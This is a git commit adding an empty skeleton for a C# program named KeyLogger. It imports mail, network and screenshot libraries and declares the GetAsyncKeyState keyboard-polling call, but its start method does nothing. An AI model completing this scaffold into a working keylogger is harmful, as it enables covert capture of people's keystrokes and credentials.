54d231d23facd85e261be606fd56d6ec72b5d30c
unknown <laky.bulatovic95@gmail.com>
2020-04-18 22:57:59 +0200

    initial commit

---
+++ KeyLogger/Program.cs
@@ -0,0 +1,29 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Drawing;
+using System.IO;
+using System.IO.Compression;
+using System.Net;
+using System.Net.Mail;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Timers;
+using System.Windows.Forms;
+
+namespace KeyLogger
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+        static void Main(string[] args)
+        {
+            new Program().start();
+        }
+
+        private void start()
+        {
+            
+        }
+    }
+}
